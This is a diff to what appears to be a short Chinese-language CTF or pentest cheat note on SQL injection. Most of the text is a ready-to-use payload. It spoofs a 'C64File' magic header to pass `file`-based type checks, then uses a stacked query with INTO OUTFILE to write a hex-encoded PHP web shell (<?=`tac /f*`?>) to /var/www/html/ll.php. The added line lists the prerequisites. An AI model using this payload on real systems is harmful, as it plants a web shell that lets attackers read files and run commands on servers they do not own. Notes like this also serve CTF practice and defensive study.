@@ -1,3 +1,4 @@
+前置条件：1.堆叠注入开启2.文件写入开启
 C64File "');select 0x3c3f3d60746163202f662a603f3e into outfile '/var/www/html/ll.php';--+
 服务器检测文件类型并写入数据库时用C64File魔数文件头
 C64File魔数文件头可以将file检测的结果变成后面跟随的"');select 0x3c3f3d60746163202f662a603f3e 
